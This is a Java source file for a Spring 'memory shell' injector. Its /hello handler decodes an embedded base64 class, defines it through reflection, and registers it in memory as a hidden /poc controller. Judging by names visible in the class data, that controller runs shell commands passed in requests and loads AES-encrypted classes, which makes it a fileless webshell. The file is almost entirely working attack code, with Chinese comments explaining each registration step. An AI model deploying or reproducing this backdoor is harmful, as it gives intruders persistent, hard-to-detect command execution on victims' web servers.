package com.memshell.spring;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.support.XmlWebApplicationContext;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import sun.misc.BASE64Decoder;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

@Controller
public class ControllerBased{

    @RequestMapping("/hello")
    public String say() {
        System.out.println("[+] Hello, Spring");

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Class clazz = null;
        try{
            clazz = classLoader.loadClass("com.memshell.generic.DynamicControllerTemplate");
        }catch(ClassNotFoundException e){
            try{
                BASE64Decoder base64Decoder = new BASE64Decoder();
                String codeClass = "yv66vgAAADIBSAoAOQCVCACWCQBTAJcKAFMAmAkAmQCaCACbCgCcAJ0IAHMLAJ4AnwgAoAoAoQCiCgChAKMHAKQKAKUApgoApQCnCgCoAKkKAA0AqggAqwoADQCsCgANAK0LAK4ArwoAsACdCACxBwCyCgAYAJUIALMKABgAtAoAtQC2CgAYALcKABgAuAgAuQoAoQC6CgChALsLAJ4AvAgAvQsAvgC/CgCwAMAIAMEKAMIAwwcAxAsAvgDFCgChAMYKACgAxwoAwgDIBwDJCgAtAJULAJ4AygoAywDMCgAtAM0KAMIAzgkAUwDPCADQBwDRBwBnBwDSCgA1ANMHANQKANUA1goA1QDXCgDYANkKADUA2ggA2wcA3AcA3QcA3goAQQDfCADgCgA3AOEHAOIKADkA4wkA5ADlBwDmCgA1AOcIAOgKANgA6QoA5ADqBwDrCgBNAN8HAOwKAE8A3wcA7QoAUQDfBwDuAQAIcGFzc3dvcmQBABJMamF2YS9sYW5nL1N0cmluZzsBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAwTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNDb250cm9sbGVyVGVtcGxhdGU7AQAFbG9naW4BAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAGcmVzdWx0AQADY21kAQADa2V5AQAGY2lwaGVyAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAJbQgEACWV2aWxDbGFzcwEACmV2aWxPYmplY3QBABJMamF2YS9sYW5nL09iamVjdDsBAAx0YXJnZXRNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdHlwZQEADVN0YWNrTWFwVGFibGUHAO8HAN4BAApFeGNlcHRpb25zAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmc7AQAFdmFsdWUBAAQvcG9jAQAKaW5pdGlhbGl6ZQEAAmV4AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAFY2xhenoBAAZtZXRob2QBAARjb2RlAQAFYnl0ZXMBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsHAO4HANIHAOIHANEHAPAHAOYHAOsHAOwHAO0BAApTb3VyY2VGaWxlAQAeRHluYW1pY0NvbnRyb2xsZXJUZW1wbGF0ZS5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAWABZAQAEcGFzcwwAVABVDAB8AFkHAPEMAPIA8wEAHlsrXSBEeW5hbWljIFNlcnZsZXQgc2F5cyBoZWxsbwcA9AwA9QD2BwD3DAD4APkBAAViYXNpYwcA7wwA2wD6DAD7APwBABFqYXZhL3V0aWwvU2Nhbm5lcgcA/QwA/gD/DAEAAQEHAQIMAQMBBAwAWAEFAQACXEEMAQYBBwwBCAEJBwEKDAELAQwHAQ0BAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAEOAQ8HARAMAREBEgwBDgETDAEUAQkBAAEtDAEVARYMARcBGAwBGQEaAQABdQcBGwwBHAEdDAEeAPYBAANBRVMHAR8MASABIQEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMASIBIwwBJAElDABYASYMAScBKAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMASkBKgcBKwwBLAEJDAEtAS4MAS8BMAwAVgBXAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMATEBMgEAEGphdmEvbGFuZy9PYmplY3QHATMMATQBNQwBNgE3BwDwDAE4ATkMAToBOwEABmVxdWFscwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MATwAWQEAImNvbS5tZW1zaGVsbC5nZW5lcmljLk15Q2xhc3NMb2FkZXIMAT0BPgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAE/AUAHAUEMAUIAVwEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAUMBQAEDEHl2NjZ2Z0FBQURJQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNSTVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2pzQkFBRmpBUUFYVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQXRrWldacGJtVkRiR0Z6Y3dFQUxDaGJRa3hxWVhaaEwyeGhibWN2UTJ4aGMzTk1iMkZrWlhJN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUZZbmwwWlhNQkFBSmJRZ0VBQzJOc1lYTnpURzloWkdWeUFRQUtVMjkxY21ObFJtbHNaUUVBRWsxNVEyeGhjM05NYjJGa1pYSXVhbUYyWVF3QUJnQUhBUUFpWTI5dEwyMWxiWE5vWld4c0wyZGxibVZ5YVdNdlRYbERiR0Z6YzB4dllXUmxjZ3dBRHdBYUFRQVZhbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5QVFBWEtGdENTVWtwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNBSVFBQ0FBVUFBQUFBQUFJQUFBQUdBQWNBQVFBSUFBQUFPZ0FDQUFJQUFBQUdLaXUzQUFHeEFBQUFBZ0FKQUFBQUJnQUJBQUFBQkFBS0FBQUFGZ0FDQUFBQUJnQUxBQXdBQUFBQUFBWUFEUUFPQUFFQUNRQVBBQkFBQVFBSUFBQUFSQUFFQUFJQUFBQVF1d0FDV1N1M0FBTXFBeXErdGdBRXNBQUFBQUlBQ1FBQUFBWUFBUUFBQUFnQUNnQUFBQllBQWdBQUFCQUFFUUFTQUFBQUFBQVFBQk1BRGdBQkFBRUFGQUFBQUFJQUZRPT0MAUQBRQwBRgFHAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEALmNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNDb250cm9sbGVyVGVtcGxhdGUBABBqYXZhL2xhbmcvU3RyaW5nAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADmphdmEvdXRpbC9VVUlEAQAKcmFuZG9tVVVJRAEAEigpTGphdmEvdXRpbC9VVUlEOwEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAVwcmludAEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQANZ2V0U3VwZXJjbGFzcwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsAIQBTADkAAAACAAIAVABVAAAAAgBWAFcAAAADAAEAWABZAAEAWgAAAEUAAgABAAAADyq3AAEqEgK1AAMqtwAEsQAAAAIAWwAAABIABAAAABcABAAYAAoAGQAOABoAXAAAAAwAAQAAAA8AXQBeAAAAAQBfAGAAAwBaAAACoQAHAAkAAAF6sgAFEga2AAcrEgi5AAkCAE4txgBPLRIKtgALmQBGKyq0AAO5AAkCADoEGQTGADIZBLYADJoAKrsADVm4AA4ZBLYAD7YAELcAERIStgATtgAUOgUsuQAVAQAZBbYAFqcBGy3GARctEhe2AAuZAQ4rKrQAA7kACQIAxgBBuwAYWbcAGRIatgAbuAActgAdtgAeEh8SGrYAIBAQtgAhOgQruQAiAQASIxkEuQAkAwAsuQAVAQAZBLYAJbESJrgAJzoEGQQFuwAoWbsAGFm3ABkruQAiAQASI7kAKQIAtgAdEhq2ABu2AB62ACoSJrcAK7YALBkEuwAtWbcALiu5AC8BALYAMLYAMbYAMjoFKrQAMxI0Bb0ANVkDEjZTWQQSN1O2ADgBBb0AOVkDGQVTWQS4ADq2ADtTtgA8wAA1OgYZBrYAPToHGQYSPgW9ADVZAxI/U1kEEkBTtgA4OggZCBkHBb0AOVkDK1NZBCxTtgA8V6cACjoEGQS2AEKxAAIAbgC4AXIAQQC5AW8BcgBBAAMAWwAAAGIAGAAAAB4ACAAgABEAIQAeACIAKgAjADcAJABTACUAXgAnAG4AKQB7ACoAngArAK0ALAC4AC0AuQAwAMAAMQDxADIBCwAzAT0ANAFEADUBWwA2AW8AOQFyADcBdAA4AXkAOwBcAAAAhAANAFMACwBhAFUABQAqADQAYgBVAAQAngAbAGMAVQAEAMAArwBkAGUABAELAGQAZgBnAAUBPQAyAGgAVwAGAUQAKwBpAGoABwFbABQAawBsAAgBdAAFAG0AbgAEAAABegBdAF4AAAAAAXoAbwBwAAEAAAF6AHEAcgACABEBaQBzAFUAAwB0AAAAEwAF/ABeBwB1AvsAV/cAuAcAdgYAdwAAAAQAAQBPAHgAAAAOAAEAeQABAHpbAAFzAHsAAgB8AFkAAQBaAAACAwAHAAcAAACpuAA6tgA7TCorEkO2AES1ADOnAH9NK7YARk4BOgQZBMcAMy0SOaUALS0SNAa9ADVZAxI2U1kEsgBHU1kFsgBHU7YAODoEp//YOgUttgBJTqf/zhJKOgW7AC1ZtwAuGQW2ADE6BhkEBLYASyoZBCsGvQA5WQMZBlNZBAO4AExTWQUZBr64AExTtgA8wAA1tQAzpwAYTCu2AE6nABBMK7YAUKcACEwrtgBSsQAFAAcAEQAUAEUAKABFAEgASAAAAJAAkwBNAAAAkACbAE8AAACQAKMAUQADAFsAAABqABoAAAA/AAcAQQARAFEAFABCABUAQwAaAEQAHQBFACgARwBFAEoASABIAEoASQBPAEoAUgBNAFYATgBkAE8AagBQAJAAWACTAFIAlABTAJgAWACbAFQAnABVAKAAWACjAFYApABXAKgAWQBcAAAAcAALAEoABQB9AH4ABQAaAHYAfwBXAAMAHQBzAIAAbAAEAFYAOgCBAFUABQBkACwAggBnAAYAFQB7AG0AgwACAAcAiQCEAIUAAQCUAAQAbQCGAAEAnAAEAG0AhwABAKQABABtAIgAAQAAAKkAXQBeAAAAdAAAADoACf8AFAACBwCJBwCKAAEHAIv+AAgHAIsHAIwHAI1qBwCOCf8APQABBwCJAABCBwCPRwcAkEcHAJEEAAIAkgAAAAIAkwB4AAAABgABAJQAAA==";
                byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                Method method = null;
                Class clz = classLoader.getClass();
                while(method == null && clz != Object.class ){
                    try{
                        method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    }catch(NoSuchMethodException ex){
                        clz = clz.getSuperclass();
                    }
                }
                method.setAccessible(true);
                clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
            }catch (Exception ex){
                //continue;
            }
        }


        XmlWebApplicationContext context = null;
        try{
            context = (XmlWebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        }catch(Exception e){
            context = (XmlWebApplicationContext)ContextLoader.getCurrentWebApplicationContext();
        }

        try{
            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
            Method method = clazz.getDeclaredMethod("login", HttpServletRequest.class, HttpServletResponse.class);
            // 3. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition("/poc");
            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. 在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, clazz.newInstance(), method);
        }catch(Exception e){
            //continue
        }

        try{
            // 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean
            context.getBeanFactory().registerSingleton("dynamicController", clazz.newInstance());
        }catch(Exception e){
            //continue
        }


        try{
            // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean
            Object dh = context.getBean(Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping"));
            // 3. 反射获得 registerHandler Method
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping").getDeclaredMethod("registerHandler", String.class, Object.class);
            method.setAccessible(true);
            // 4. 将 dynamicController 和 URL 注册到 handlerMap 中
            method.invoke(dh, "/poc", "dynamicController");
        }catch(Exception e){
            //continue
        }

        try{
            Object requestMappingHandlerMapping = context.getBean(Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping"));
            Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("detectHandlerMethods", Object.class);
            method.setAccessible(true);
            method.invoke(requestMappingHandlerMapping, "dynamicController");
        }catch(Exception e){
            //continue;
        }

        return "success";
    }
}